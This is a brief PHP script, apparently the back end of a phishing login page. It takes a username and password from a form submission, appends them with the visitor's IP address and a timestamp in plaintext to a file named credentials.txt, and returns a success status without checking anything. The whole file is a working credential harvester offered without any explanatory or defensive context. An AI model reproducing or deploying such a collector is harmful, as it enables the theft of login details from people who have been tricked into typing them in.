<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents('credentials.txt', 
    "Username: $username\nPassword: $password\nIP: {$_SERVER['REMOTE_ADDR']}\nDate: ".date('Y-m-d H:i:s')."\n\n", 
    FILE_APPEND);

http_response_code(200);